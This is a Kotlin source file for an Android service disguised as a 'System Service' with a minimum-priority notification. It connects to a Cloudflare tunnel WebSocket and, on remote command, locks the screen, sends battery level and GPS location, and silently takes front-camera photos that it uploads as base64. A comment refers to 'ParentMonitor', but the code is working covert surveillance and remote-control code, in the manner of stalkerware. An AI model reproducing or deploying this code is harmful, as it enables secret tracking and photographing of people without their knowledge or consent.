package com.system.service.core

import android.app.*
import android.content.Intent
import android.hardware.camera2.*
import android.location.Location
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
        startForeground(1, buildNotification())
        try {
            connectServer()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        wsManager?.disconnect()
    }

    private fun connectServer() {
        wsManager = WebSocketManager(
            serverUrl = SERVER_URL,
            onMessage = { handleCommand(it) },
            onConnected = { },
            onDisconnected = { }
        )
        wsManager?.connect()
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {
                "lock_screen" -> lockScreen()
                "get_battery" -> sendBattery()
                "get_location" -> sendLocation()
                "take_photo" -> sendPhoto()
            }
        } catch (e: Exception) { }
    }

    fun sendData(type: String, data: JSONObject) {
        try {
            data.put("type", type)
            data.put("timestamp", System.currentTimeMillis())
            wsManager?.send(data)
        } catch (e: Exception) { }
    }

    private fun lockScreen() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE)
                as android.app.admin.DevicePolicyManager
            dpm.lockNow()
        } catch (e: Exception) { }
    }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE)
                as android.os.BatteryManager
            // Key must be "battery" — ParentMonitor reads data.optInt("battery")
            val level = bm.getIntProperty(
                android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            sendData("battery", JSONObject().apply {
                put("battery", level)
            })
        } catch (e: Exception) { }
    }

    private fun sendLocation() {
        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { location: Location? ->
                location?.let {
                    sendData("location", JSONObject().apply {
                        put("lat", it.latitude)
                        put("lng", it.longitude)
                    })
                }
            }
        } catch (e: Exception) { }
    }

    private fun sendPhoto() {
        try {
            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) ==
                        CameraCharacteristics.LENS_FACING_FRONT
            } ?: cameraManager.cameraIdList.firstOrNull() ?: return

            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
            val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
            val size = sizes.minByOrNull { it.width * it.height } ?: return

            val imageReader = android.media.ImageReader.newInstance(
                size.width, size.height, android.graphics.ImageFormat.JPEG, 1)

            val handlerThread = android.os.HandlerThread("CameraThread").apply { start() }
            val cameraHandler = android.os.Handler(handlerThread.looper)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val session = imageReader.surface
                    val captureRequest = camera.createCaptureRequest(
                        CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(imageReader.surface)
                    }.build()

                    camera.createCaptureSession(
                        listOf(session),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                s.capture(captureRequest, object :
                                    CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        session: CameraCaptureSession,
                                        request: android.hardware.camera2.CaptureRequest,
                                        result: android.hardware.camera2.TotalCaptureResult
                                    ) {
                                        val image = imageReader.acquireLatestImage()
                                        image?.let {
                                            val buffer = it.planes[0].buffer
                                            val bytes = ByteArray(buffer.remaining())
                                            buffer.get(bytes)
                                            val b64 = android.util.Base64
                                                .encodeToString(bytes,
                                                    android.util.Base64.NO_WRAP)
                                            sendData("photo", JSONObject().apply {
                                                put("image", b64)
                                            })
                                            it.close()
                                        }
                                        camera.close()
                                        handlerThread.quitSafely()
                                    }
                                }, cameraHandler)
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                camera.close()
                                handlerThread.quitSafely()
                            }
                        }, cameraHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, cameraHandler)
        } catch (e: Exception) { }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "main", "System",
            NotificationManager.IMPORTANCE_MIN)
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "main")
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onStartCommand(
        intent: Intent?, f: Int, id: Int
    ) = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null
}
